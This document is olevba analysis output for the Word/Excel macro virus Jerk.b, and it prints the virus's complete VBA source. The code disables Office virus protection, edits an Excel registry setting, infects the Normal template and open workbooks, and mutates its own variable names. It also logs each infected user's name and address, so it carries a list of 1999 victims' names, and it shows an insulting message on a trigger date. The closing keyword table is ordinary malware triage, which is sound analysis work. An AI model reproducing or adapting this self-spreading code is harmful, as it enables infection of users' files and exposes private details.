olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Jerk.b-6053e998892114cc8a6865785efb909e0232574b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Jerk.b-6053e998892114cc8a6865785efb909e0232574b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
































Private Sub Workbook_Deactivate()
On Error Resume Next
Const RJLDWFRK = 1, DHSQOB = True, AQEFIJLF = False, YEAOZC = 0
Dim UQFBEGHGKIEWF, GKGWRT As String
Dim MSEEMBMSQ, GZIANEX As Integer
Dim CYIXYUSHPUDWK As Boolean
GKGWRT = "ThisWorkbook"
UQFBEGHGKIEWF = Application.ThisWorkbook.VBProject.VBComponents.Item(RJLDWFRK).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(RJLDWFRK).CodeModule.CountOfLines)
Call XAQLGHDPAHHPQ(UQFBEGHGKIEWF)
For MSEEMBMSQ = RJLDWFRK To Application.Workbooks.Count
CYIXYUSHPUDWK = AQEFIJLF
For GZIANEX = RJLDWFRK To Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Count
If Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).CodeModule.CountOfLines = YEAOZC Then
If Application.Workbooks.Item(MSEEMBMSQ).Path <> "" And Application.Workbooks.Item(MSEEMBMSQ).Saved = DHSQOB And CYIXYUSHPUDWK = AQEFIJLF Then CYIXYUSHPUDWK = DHSQOB
Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).CodeModule.InsertLines RJLDWFRK, UQFBEGHGKIEWF
If Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).Name = GKGWRT Then
Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).CodeModule.ReplaceLine RJLDWFRK * 33, "Private Sub Workbook_Deactivate()"
Else
Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).CodeModule.ReplaceLine RJLDWFRK * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GZIANEX
If CYIXYUSHPUDWK = DHSQOB Then Application.Workbooks.Item(MSEEMBMSQ).Save
Next MSEEMBMSQ
End Sub
Private Sub Document_Close()
On Error Resume Next
Const DHSQOB = True, AQEFIJLF = False, YEAOZC = 0, RJLDWFRK = 1, JKNJIXY = wdFormatDocument, XIXFZSVH = wdFormatTemplate, WPSNCBBRIPBBGPY = ":"
Dim CYIXYUSHPUDWK, YITXPSSVVMJKV, CNUYHCRJDPG, YGFLIH As Boolean
Dim XYSEBJVVMIRNWWY, QHBXK As Object
Dim EKSWDRTIMON, UQFBEGHGKIEWF As String
If Month(RJLDWFRK * Now) > RJLDWFRK * 2 + RJLDWFRK * 3 And Day(RJLDWFRK * Now) = 4 + RJLDWFRK * 10 Then MsgBox "V guvax " & Application.UserName & " vf n ovt fghcvq wrex!", 0, "www.all.net"
Set XYSEBJVVMIRNWWY = ActiveDocument.VBProject.VBComponents.Item(RJLDWFRK)
Set QHBXK = NormalTemplate.VBProject.VBComponents.Item(RJLDWFRK)
Randomize
CNUYHCRJDPG = AQEFIJLF
YGFLIH = AQEFIJLF
If XYSEBJVVMIRNWWY.CodeModule.CountOfLines <> YEAOZC Then CNUYHCRJDPG = DHSQOB
If QHBXK.CodeModule.CountOfLines <> YEAOZC Then YGFLIH = DHSQOB
Options.VirusProtection = AQEFIJLF
If (CNUYHCRJDPG = DHSQOB Xor YGFLIH = DHSQOB) And (ActiveDocument.SaveFormat = JKNJIXY Or ActiveDocument.SaveFormat = XIXFZSVH) Then
If CNUYHCRJDPG = DHSQOB Then
YITXPSSVVMJKV = NormalTemplate.Saved
UQFBEGHGKIEWF = XYSEBJVVMIRNWWY.CodeModule.Lines(RJLDWFRK, XYSEBJVVMIRNWWY.CodeModule.CountOfLines)
Call LTGPDEPSPQXCW(UQFBEGHGKIEWF)
If Int(Rnd * 10 * RJLDWFRK) = RJLDWFRK * 7 Then Call SQDDDDFJQOULDC(UQFBEGHGKIEWF)
Call VAPLRNIADSFEE(UQFBEGHGKIEWF)
QHBXK.CodeModule.InsertLines RJLDWFRK, UQFBEGHGKIEWF
If YITXPSSVVMJKV = DHSQOB Then NormalTemplate.Save
End If
EKSWDRTIMON = Mid(ActiveDocument.FullName, 2, RJLDWFRK)
If YGFLIH = DHSQOB And (EKSWDRTIMON = WPSNCBBRIPBBGPY Or ActiveDocument.Saved = AQEFIJLF) Then
CYIXYUSHPUDWK = ActiveDocument.Saved
UQFBEGHGKIEWF = QHBXK.CodeModule.Lines(RJLDWFRK, QHBXK.CodeModule.CountOfLines)
Call VAPLRNIADSFEE(UQFBEGHGKIEWF)
XYSEBJVVMIRNWWY.CodeModule.InsertLines RJLDWFRK, UQFBEGHGKIEWF
If CYIXYUSHPUDWK = DHSQOB Then ActiveDocument.Save
End If
End If
End Sub
Private Sub SQDDDDFJQOULDC(ByRef UQFBEGHGKIEWF As String)
On Error Resume Next
Const GWMUGPNETK = 48, HJZWOEB = 15, DGPXLANRN = 5, VXOWDVSXOYDFAV = 65, FKPCDLK = 90, RJLDWFRK = 1, DHSQOB = True, AQEFIJLF = False
Dim EOMHGIPVAC, PKXZLUJTTmp, ZLYQXCCF, PKXZLUJT(RJLDWFRK To GWMUGPNETK), PKXZLUJT2(RJLDWFRK To GWMUGPNETK) As String
Dim MSEEMBMSQ, GZIANEX, FYMWF As Integer
Dim RNZQQGFWLRSHQ As Boolean
EOMHGIPVAC = "UQFBEGHGKIEWF GWMUGPNETK PKXZLUJT PKXZLUJT2 ZLYQXCCF MSEEMBMSQ GZIANEX FYMWF RNZQQGFWLRSHQ SQDDDDFJQOULDC HJZWOEB DGPXLANRN VXOWDVSXOYDFAV FKPCDLK RJLDWFRK EOMHGIPVAC PKXZLUJTTmp CYIXYUSHPUDWK YITXPSSVVMJKV CNUYHCRJDPG YGFLIH XYSEBJVVMIRNWWY QHBXK LTGPDEPSPQXCW FVSIGEMWMAPWRJZ NMBGQTQOTH YFMOIPVFJS ZKVHDJA FVSIGEMWMAPWRJZTmp JXYQEYXUTHRGL NOAGDK EKSWDRTIMON DHSQOB AQEFIJLF YEAOZC JKNJIXY XIXFZSVH EKCQLCVL THUEYQO WPSNCBBRIPBBGPY ZHGZNKGEKQCJYUR HWFYBQWIBFOHIC GKGWRT XAQLGHDPAHHPQ VAPLRNIADSFEE HEVXOYZC NNAXL EUVLCOERXC"
Randomize
GZIANEX = RJLDWFRK
For MSEEMBMSQ = RJLDWFRK To Len(EOMHGIPVAC)
If Mid(EOMHGIPVAC, MSEEMBMSQ, RJLDWFRK) = " " Or MSEEMBMSQ = Len(EOMHGIPVAC) Then
If MSEEMBMSQ = Len(EOMHGIPVAC) Then PKXZLUJTTmp = PKXZLUJTTmp & Mid(EOMHGIPVAC, MSEEMBMSQ, RJLDWFRK)
For FYMWF = RJLDWFRK To Int((HJZWOEB - DGPXLANRN + RJLDWFRK) * Rnd + DGPXLANRN)
PKXZLUJT2(GZIANEX) = PKXZLUJT2(GZIANEX) & Chr(Int((FKPCDLK - VXOWDVSXOYDFAV + RJLDWFRK) * Rnd + VXOWDVSXOYDFAV))
Next FYMWF
PKXZLUJT(GZIANEX) = PKXZLUJTTmp
PKXZLUJTTmp = ""
GZIANEX = GZIANEX + RJLDWFRK
Else
PKXZLUJTTmp = PKXZLUJTTmp & Mid(EOMHGIPVAC, MSEEMBMSQ, RJLDWFRK)
End If
Next MSEEMBMSQ
RNZQQGFWLRSHQ = AQEFIJLF
For MSEEMBMSQ = RJLDWFRK To Len(UQFBEGHGKIEWF)
For GZIANEX = RJLDWFRK To GWMUGPNETK
If Mid(UQFBEGHGKIEWF, MSEEMBMSQ, Len(PKXZLUJT(GZIANEX))) = PKXZLUJT(GZIANEX) Then
ZLYQXCCF = ZLYQXCCF & PKXZLUJT2(GZIANEX)
MSEEMBMSQ = MSEEMBMSQ + Len(PKXZLUJT(GZIANEX)) - RJLDWFRK
RNZQQGFWLRSHQ = DHSQOB
Exit For
End If
Next GZIANEX
If RNZQQGFWLRSHQ = AQEFIJLF Then
ZLYQXCCF = ZLYQXCCF & Mid(UQFBEGHGKIEWF, MSEEMBMSQ, RJLDWFRK)
Else
RNZQQGFWLRSHQ = AQEFIJLF
End If
Next MSEEMBMSQ
UQFBEGHGKIEWF = ZLYQXCCF
End Sub
Private Sub LTGPDEPSPQXCW(ByRef UQFBEGHGKIEWF As String)
On Error Resume Next
Const ZKVHDJA = "' ", RJLDWFRK = 1
Const EKCQLCVL = "hh:mm:ss: AMPM - ", THUEYQO = "dddd, d mmm yyyy"
Dim FVSIGEMWMAPWRJZTmp, FVSIGEMWMAPWRJZ, JXYQEYXUTHRGL, NOAGDK, NMBGQTQOTH, YFMOIPVFJS As String
Dim MSEEMBMSQ As Integer
NMBGQTQOTH = Chr(10 * RJLDWFRK + 3)
FVSIGEMWMAPWRJZ = Application.UserAddress
NOAGDK = Format(Time, EKCQLCVL) & Format(Date, THUEYQO)
YFMOIPVFJS = Chr(RJLDWFRK * 10)
JXYQEYXUTHRGL = Application.UserName
For MSEEMBMSQ = RJLDWFRK To Len(FVSIGEMWMAPWRJZ)
If Mid(FVSIGEMWMAPWRJZ, MSEEMBMSQ, RJLDWFRK) <> NMBGQTQOTH Then
If Mid(FVSIGEMWMAPWRJZ, MSEEMBMSQ, RJLDWFRK) <> YFMOIPVFJS Then
FVSIGEMWMAPWRJZTmp = FVSIGEMWMAPWRJZTmp & Mid(FVSIGEMWMAPWRJZ, MSEEMBMSQ, RJLDWFRK)
End If
Else
FVSIGEMWMAPWRJZTmp = FVSIGEMWMAPWRJZTmp & NMBGQTQOTH & ZKVHDJA
End If
Next MSEEMBMSQ
UQFBEGHGKIEWF = UQFBEGHGKIEWF & NMBGQTQOTH & ZKVHDJA & NOAGDK & NMBGQTQOTH & ZKVHDJA & JXYQEYXUTHRGL & NMBGQTQOTH & ZKVHDJA & FVSIGEMWMAPWRJZ & NMBGQTQOTH
End Sub
Private Sub VAPLRNIADSFEE(ByVal UQFBEGHGKIEWF As String)
On Error Resume Next
Dim EUVLCOERXC As Long
Dim ZHGZNKGEKQCJYUR As Object
Dim HEVXOYZC, NNAXL As String
HEVXOYZC = "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
EUVLCOERXC = &H0
NNAXL = "Options6"
System.PrivateProfileString("", HEVXOYZC, NNAXL) = EUVLCOERXC
Set ZHGZNKGEKQCJYUR = GetObject(, "Excel.Application")
Const RJLDWFRK = 1, YEAOZC = 0
Dim GKGWRT As String
Dim MSEEMBMSQ, GZIANEX As Integer
GKGWRT = "ThisWorkbook"
For MSEEMBMSQ = RJLDWFRK To ZHGZNKGEKQCJYUR.Application.Workbooks.Count
For GZIANEX = RJLDWFRK To ZHGZNKGEKQCJYUR.Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Count
If ZHGZNKGEKQCJYUR.Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).CodeModule.CountOfLines = YEAOZC Then
ZHGZNKGEKQCJYUR.Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).CodeModule.InsertLines RJLDWFRK, UQFBEGHGKIEWF
If ZHGZNKGEKQCJYUR.Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).Name = GKGWRT Then
ZHGZNKGEKQCJYUR.Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).CodeModule.ReplaceLine 33 * RJLDWFRK, "Private Sub Workbook_Deactivate()"
Else
ZHGZNKGEKQCJYUR.Application.Workbooks.Item(MSEEMBMSQ).VBProject.VBComponents.Item(GZIANEX).CodeModule.ReplaceLine RJLDWFRK * 33, "Private Sub Worksheet_Deactivate()"
End If
End If
Next GZIANEX
Next MSEEMBMSQ
Set ZHGZNKGEKQCJYUR = Nothing
End Sub
Private Sub XAQLGHDPAHHPQ(ByVal UQFBEGHGKIEWF As String)
On Error Resume Next
Const DHSQOB = True, AQEFIJLF = False, RJLDWFRK = 1, YEAOZC = 0
Dim HWFYBQWIBFOHIC As Object
Dim YITXPSSVVMJKV As Boolean
Set HWFYBQWIBFOHIC = GetObject(, "Word.Application")
If HWFYBQWIBFOHIC.NormalTemplate.VBProject.VBComponents.Item(RJLDWFRK).CodeModule.CountOfLines = YEAOZC Then
YITXPSSVVMJKV = HWFYBQWIBFOHIC.NormalTemplate.Saved
HWFYBQWIBFOHIC.Options.VirusProtection = AQEFIJLF
HWFYBQWIBFOHIC.NormalTemplate.VBProject.VBComponents.Item(RJLDWFRK).CodeModule.InsertLines RJLDWFRK, UQFBEGHGKIEWF
If YITXPSSVVMJKV = DHSQOB Then HWFYBQWIBFOHIC.NormalTemplate.Save
End If
Set HWFYBQWIBFOHIC = Nothing
End Sub

' 10:19:12: PM - Tuesday, 9 Feb 1999
' Jack Anderson
'

' 04:17:19: PM - Friday, 19 Feb 1999
' David Henry
'

' 01:29:47: PM - Monday, 22 Feb 1999
' Vivian Henry
'

' 02:12:26: PM - Wednesday, 24 Feb 1999
' RHassell
'

' 11:10:07: AM - Monday, 1 Mar 1999
' David Sumlin
'

' 06:19:12: PM - Friday, 5 Mar 1999
' John Holz
'

' 10:07:54: AM - Wednesday, 17 Mar 1999
' Tony Vieira
'

' 05:03:04:  - fredag, 19 mar 1999
' Åke Marninger
'

' 10:36:23:  - tisdag, 23 mar 1999
' Ericsson User
'

' 09:01:20:  - torsdag, 25 mar 1999
' Ericsson User
'

' 12:54:16:  - tisdag, 6 apr 1999
' Ericsson User
'

' 01:59:36:  - torsdag, 8 apr 1999
' Ericsson User
'

' 12:20:07:  - tisdag, 13 apr 1999
' RED2
'

' 12:35:46: PM - Wednesday, 19 May 1999
' Ditry PC
'

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

